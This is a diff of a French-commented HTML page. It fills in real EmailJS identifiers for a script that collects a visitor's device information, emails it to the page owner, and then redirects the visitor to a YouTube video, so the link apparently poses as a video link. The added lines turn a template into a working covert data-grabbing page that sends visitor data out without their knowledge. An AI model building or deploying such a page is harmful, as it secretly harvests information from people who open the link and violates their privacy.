@@ -20,7 +20,7 @@
 
   <script>
     // Initialiser EmailJS
-    emailjs.init("YOUR_USER_ID"); // remplace par ton user ID EmailJS
+    emailjs.init("p4EUo3izwOuAcZMmk"); // remplace par ton user ID EmailJS
 
     function sendDeviceInfo() {
       const deviceInfo = {
@@ -31,14 +31,14 @@
         timestamp: new Date().toString()
       };
 
-      emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", deviceInfo)
+      emailjs.send("service_rdyzfdq", "service_rdyzfdq", deviceInfo)
         .then(() => {
           // Redirection après envoi
-          window.location.href = "https://twitch.tv/tonpseudo"; // change vers ton lien
+          window.location.href = "https://www.youtube.com/watch?v=NB7WuqWzDhw"; // change vers ton lien
         })
         .catch((error) => {
           console.error("Erreur lors de l’envoi :", error);
-          window.location.href = "https://twitch.tv/tonpseudo";
+          window.location.href = "https://www.youtube.com/watch?v=NB7WuqWzDhw";
         });
     }
 
